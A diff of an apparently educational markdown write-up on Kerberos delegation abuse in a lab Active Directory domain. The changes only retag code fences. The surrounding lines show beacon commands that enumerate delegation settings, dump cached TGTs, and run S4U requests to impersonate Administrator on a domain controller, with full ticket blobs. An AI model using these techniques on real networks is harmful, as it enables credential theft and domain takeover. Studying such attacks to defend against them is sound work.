@@ -114,7 +114,7 @@ So if we have control over a machine with `TRUSTED_FOR_DELEGATION` and a high-pr
 
 ### Enumeration
 we can use ldap query to filter only computer accounts with [SAM-Account-Type attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype) of `0x30000001` which resolves in decimal to `805306369` and using bitwise AND with trusted for delegation flag `524288`, all other flags can be found [here](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties) 
-```bash
+```shell
 beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
 
 --------------------
@@ -132,7 +132,7 @@ As expected we see that `WS01$` is configured with `TRUSTED_FOR_DELEGATION`
 ### Exploitation
 If we forced auth with high level user and used a tool like [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) to see what tickets are cached we can see that a high level user (administrator) has authenticated to the `WS01` and `WS01` cached it's TGT (we can tell it is TGT because the service is `KRBTGT`) 
 
-```bash
+```shell
 beacon> krb_triage
 [+] Kerbeus TRIAGE by RalfHacker
 [+] host called home, sent: 13289 bytes
@@ -159,7 +159,7 @@ Action: List Kerberos Tickets (All Users)
 
 
 Now we can dump the ticket:
-```bash
+```shell
 beacon> krb_dump /luid:24ab54
 [+] Kerbeus DUMP by RalfHacker
 [+] host called home, sent: 16794 bytes
@@ -212,7 +212,7 @@ I like to think of it as unconstrained delegation but with guardrails, instead o
 
 
 So instead of relying on the `TRUSTED_FOR_DELEGATION` flag like in unconstrained case, constrained delegation is controlled through the `msDS-AllowedToDelegateTo` attribute on the computer account which is a list of `SPNs` that this machine is allowed to act against on behalf of a user.
-```
+```shell
 beacon> ldapsearch (&(objectclass=computer)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
 [*] Filter: Filter: (&(objectclass=computer)(msDS-AllowedToDelegateTo=*))
 [*] Scope of search value: 3
@@ -234,7 +234,7 @@ Now let's discuss `S4U2self` and `S4U2proxy` in details
 
 One way to actually know if server is configured with Protocol Transition we need to see `TRUSTED_TO_AUTH_FOR_DELEGATION` flag is enabled or not (it is not by default), this can be done by enumerating   `UserAccountControl` attribute of the computer object.
 
-```bash
+```shell
 beacon> ldapsearch (&(objectclass=computer)(samaccountname=SRV02$)) --attributes userAccountControl
 
 userAccountControl: 16781312
@@ -355,7 +355,7 @@ for i in dec:
 
 
 we will get this decoded TGT:
-```
+```shell
 Sequence:
  field-0=1088487424
  field-1=Sequence:
@@ -384,7 +384,7 @@ Sequence:
 `Field-0` is  The Ticket Flags, `Field-9` is The PAC. But what we are need is `field-1` where it is the session key. we will use it as key to decrypt the Authenticator, but first we need to change the Key Usage integer from 2 to 7, so it will be like this: `jnk = cipher.decrypt(key, 2, unhexlify(mycipher))`. 
 
 Now after running the script again we get the decoded authenticator:
-```
+```shell
 Sequence:
  field-0=5
  field-1=LOL.LOCAL
@@ -441,7 +441,7 @@ If we compromised the `SRV02` machine and extracted the TGT for the `SRV02$` mac
 ### Getting SRV02's TGT
 
 
-```
+```shell
 beacon> krb_dump /luid:3e4 /service:krbtgt
 [+] Kerbeus DUMP by RalfHacker
 [+] host called home, sent: 16807 bytes
@@ -480,7 +480,7 @@ We can see that it has `forwardable` flag enabled, which is a must in order to c
 
 ### Requesting S4U2Self, S4U2Proxy
 
-```
+```shell
 beacon> krb_s4u /ticket:doIE1DCCBNCgAwIBBaEDAgEWooID5DCCA+BhggPcMIID2KADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDojCCA56gAwIBEqEDAgECooIDkASCA4z5L2UXOO1EAqTexFsnZLzhEn7s3m6yWAphFz4AKYp9MGXbbUDys+e1GTz/HnshQJXkSfcXK+WWlOvsb8p3iGo9p2oCY0bLznYHbYnFgI4Rvj9+aT8rP33w0mngS/cyv6/Dx0/bjQV41IKObdJnNI/9xgmtnV/0S36EzkeeASkds7GUzlzImFlsdIPA4uRVAbC26jYp+irrcqI7NVqy9mD6ZFdwAAalYP2jaQR7seAgw2x/ml13y7U4Fj2fQeGyF0uX1YSNwzewoV0V/5FZcXquxHFmwtq1FfQAKcityaUDLAln4ITF69y4SjO8CKIE5tFLtVVmnT/qO30YDSEshrvZj9y2pMkB15fRBqzC9wyN9hOVd+zQ7tLkHnpgrKUHUw4An43ITzmXFcw1PUQykKY3p7LWjQCma8eMAL2KUoJH7r97gD3wJ045YGuToo6GPpa3ecRPKRlkwaUeDvlZsU7klBWv+Xw+uX9+WJ4OzFQPDInoLyQ/w9Luyfzzk5dqDqXXqp39JejsgSw6IRRUOoNn+6/NH1olpazYSyh/Sfwi5ZNf9SLIKX+2zrDQ1HySyL3hb6FmBkfoBkEMCi9ey5IrUTQtjNunR9K+/W+1OjVjNKx9Bpp4BeuSMNGLiVPvv+QLgpbs1jBbP1yMqcbV1lq0Ba2ZA/XsA/Qmn8gjiJuumS8d+kzbEXXb9R0wB1rOwQspm93Qm0r+ooUozQg7uAS+yJ5G4OoZ2+g1vJ5uaSo/PB2uHKyfARkVn/S54mKIkJmV38jS4VHTlJgeOItYE3r+1tIpduZLXHuNiPRlLFCiKSFAhbOLiE7ff7/Iqh4BgDSbZ9uw5fvOQct1XqFtvx/egGStLdeBMwJPz6qt+j/NJy5so/vq05Xo2kqwWudSk8uO8TTLKvuDiv3gcx109hmYb6ckdSnu8re19Z+p7oV4rFCF8oVR1ku9qpkJkzSBJLcDIidflVIhSGsDsnSrTrJmbDnojWJijmicjw/9ytr22gZuZ427FWuJsvYxSRJg8x3d2O+AGJvtdREot8BoK5b2NOVHSh1Ljg+VC2BKSWQD3pKjTK7dBoEt1tSYAnaZsxrYChVJDQIXZ7HmE2rSd6+aFHd2a77zigp6sThaTODb311lYHpMyemkEyjwfREYCMBgE7X5eLoVBjoOsWAFuKUOZyUTnm93WCdZUWa/e7x5shPcy6mj3V1ZRtFcU6OB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIFHYjRGP5xBr8//JF8phM2/J4MIZUHjfQPLjUjib/h6ToQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKMHAwUAQOEAAKURGA8yMDI2MDMyODIwNDI0OFqmERgPMjAyNjAzMjkwNjQyNDhapxEYDzIwMjYwNDA0MjA0MjQ4WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA== /service:cifs/dc01 /impersonateuser:Administrator
 [+] Kerbeus S4U by RalfHacker
 [+] host called home, sent: 69064 bytes
@@ -561,7 +561,7 @@ In the req-body it is asking the KDC for ST for the `cifs\DC01`, And there is a 
 The main reason that `s4u` attack worked when we had protocol transition enabled because the TGS was forwardable as we have seen above with `krb_description` command, but is it the same here?
 
 
-```
+```shell
 beacon> krb_s4u /service:cifs/dc01 /impersonateuser:Administrator /ticket:doIE1DCCBNCgAwIBBaEDAgEWooID5DCCA+BhggPcMIID2KADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDojCCA56gAwIBEqEDAgECooIDkASCA4xqoTl9ed6iyQsFWh0GxZnc1Kwd/3PQzeu1qJzfUPAvepWSgkJHJXKJT5EBn0jgBwSg2p5Zjd2No5oiTuxC13BDsHjPLcQ22xmUGAXU5AuoSN+22Wu9OISqsMR2NphyCbtf3S9WCHRrdHLtv+GCJ0JnyIgo8sZcZ8YN+kt1mSNbleSRvyUpQK93Trl/iyA3uRur2hVeOZWDgzRhypEJJlqUdDgXE7OrZDEs6mLvO4AJhiLR+8A2jCE//BsZvNYjlGcRgcjPpqKQzEMJMl9++jp5n29ethuKE1RNNR/wgCW7K7sZMSTYmBxN9RqcKjkiBNrpW812n4oaRoPb+T90RpCJKB9Wcqv/nr8zdRqH1yooZp8tpzURGUTmoD0TDOauOOkND0QXq75mhXTukJsjXtfhFPEe420p/ObVJxYeJp1NoaPEMP0tLJtTURf6b8aCHy7AN9QwehThLfCUFDuRg/0rtri572Kr+MHLki4Fkku2ynpI5Q5G/akCRtHqGlEmZXu4C1MlTaKwSbfpMgSQ7Iui9KJtBXANIe/R7wijfmsmy+mCyu6Ltlwzl87PkaSotEHNU7UmM3Duhi1Gtitk9ghrtmfNV4vneRvhTU9sNVLCDQZ3bCvC0tW462GhAP4SrKaWZ6a5zW9owhrRGue+9BV1TduWaE2PHOKXZQ2d5QZujm/Z2QIzpBB1cydrJTNNKQ33B8z4+OL1sU1/hvq+7xfFu2kQl8fjDtLo8OIHK42cZ1CmRpnATs8pWu8ZKF3GCRZd9ALx/Xx6H2xppTBH8It1u/+RrfHGeYHbAtOK3th4GbhgENKJngbrcPEvtHTcCsr0YJrsAS+UVjvSHpy40oiYNkVRQgr40p4VG+dNRcXxJVjqeQyd7fnVpxP+mm9Zc0/f8ES59dyVClQF+S7RXeD6ZsmUY/I9/wXx8Fs7BIxbTuuw6SWqEv2/19OKeOhXgmgfz3AHK5DtTgwBQMPJgAM5h5Ljl/Mw7WmfCw/7/J5/uT65ZIxC8VEqzo7Emj1VMnlzbi3/R3bU5xpsoUnncVPWCDru58nSWTwFhOo2ay+bPqsU/B+DhZDtoQNR+3nqIQt/cV/eEksY3F9hYyWErfGdYt+td+5nPgt7nz+Z/BYfI1OxGbA7ZUP1Rmfp2T7wjfs/Di0azoHncVccItXbQC3l08ClcU0Q4nVhQVTJoBbNbvSVwhGE4JvaCd9aVKOB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIE9iLIb2vV2RpzzP9soKd4WZlA1xPfGDSp9Gya3NALVfoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKMHAwUAQOEAAKURGA8yMDI2MDMyOTEwMDQ1N1qmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwNDA1MTAwNDU3WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
 [+] Kerbeus S4U by RalfHacker
 [+] host called home, sent: 69064 bytes
@@ -583,7 +583,7 @@ doIFRDCCBUCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoQsbCUxPTC5MT0NBTKITMBGgAwIB
 
 
 Actually no. Without protocol transition we cannot use `srv02` to get a forwardable service ticket with S4U2Self. if we use `krb_describe` to see the s4u2self that we got back it will not have forwardable flag.
-```
+```shell
 beacon> krb_describe /ticket:doIFRDCCBUCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKOCBCEwggQdoAMCARKhAwIBBaKCBA8EggQLQdmjdd3E1Dij26Ttv9OyqAKYP6C00cnZbqcQ+/wdDWNkb+8N+hbDSIGEiomqQhamkXd+8gFdN2XDDqRECpHpzlgEjqOgyo00Rsbfdu9BH3hRAon7pD2ha9o7EehmZLaxEt3aySkL/y7ULhLxpj3nvtX2rDdFn0g1gec0931hxiLB8lCwSelPnRQ702enyiI/RYbhYrCFWtknSCyU5jUK1ZXh66u7G0QfLYRu5IkdYKQ37JAdjRAotrELHnRTYHgfJkMw1jPLBGx4hLopXfUf21nyLyGufri9z0KiubLwkueb9vcUV07ANsvhjw513P9JNJFrgjGz7MYCLDpyiHPe+fZWaN0fwQvTiePoyakwEaeTHTBsJ4W5WIZ9k/HciIj361a42DFaxjCYrK5hda2NIoALKHBWg/TIncLJGpidXD3TtUa5lBLODM6KaUyUa1bRLRGds3UwsLxSD5M4LhBMCi86GSdeZdS2kxB0lAepPg9u5nMhXK6qHgMvWUt8ug8dyctbuHW544/mw6v3G7YXu0XOgh51w0u6fkTjfnJCKDi7iEEdlNvnQ3iDw2aNKW0ooeEWCbwoV+VIOgg31L5IsagsVjkk4VRSzK11L3nCjGiVwGwyXfRAQPhxygMoS1/82QGkAlmeP3oUVX9AhriUmwNA9cWf8FYRyBGtMfiBBG7SiwOfMV6n4Bu1sX676vhNNmdUUohf2rBPJV9fpidpZ9I5ho1NBwTR4D3iAPWp5H2KYUEtPkAGYSCLtza3ULblyRbn4E7aktTJrML09SCXRaJDHTE0UNIIBcUxpvcyVR8I7hbb4Db843o/oW81WHwKIGsnE36ysNrXmE4zOnVIP6a9JHFtIclTb5EQ1BSJDUS7Spoge1rdVf67BFVHp49ChOz6rupofeEPZsEw3gf71wCZzytA6iQHVf6mxGXFj8o1irrWvi1wBdrAMSXZwui3v1M7ny3ZIFXQkLAGsuiySTLUqhrsa7OzM2yabAGfbGv0cpawTiNhEePquNhFXWIgQvADfrKMOV0ha1iz5SOfeyWipNpzzu23JlIPo7GN+l2IjdGf8v2NBosjQZGlH4piTMRuL33Bdhvj+v5qOiPgnuMRDaQdLxQSy1iljfrcO1TANwJJlG3N7Hm7eudw6eRnsQrpjm+LlhizKwTo8lTJNQbLpYaMmrAz8Op1q/0Kz1VVUVb39lUrZIdReoN6BN+SQ5TMPL6H4tANcRzVulK7+LuS6AMbBpoaH9Me3biKo/2emKe8jh0r/dCwQ8L6hPNU2HgddrjpkE5uOmGhzE+pCIrQTyDOHLSMcLSEwowrqNlZCTsOSdNiWB+Dfo/eOdVaR2Hf9jCrnkj3SGFyU+oKxeW7RvVjmrTPRmV1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgKzApoAMCARKhIgQgA3/TI3ao+rtKQ+7bqwj+kAFj51D0yrpEH5E9CcPqQeOhCxsJTE9MLkxPQ0FMohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI2MDMyOTE2NTc1MlqmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwMzMwMTY1NzUyWqgLGwlMT0wuTE9DQUypEzARoAMCAQGhCjAIGwZTUlYwMiQ=
 [+] Kerbeus DESCRIBE by RalfHacker
 [+] host called home, sent: 24796 bytes
@@ -626,7 +626,7 @@ actually both will have it, `EncTicketPart` and `EncKDCRepPart` one is for DC01 
 {: .prompt-info }
 
 So after decrypting it we will get this:
-```
+```shell
 Sequence:
  field-0=1082195968
  field-1=Sequence:
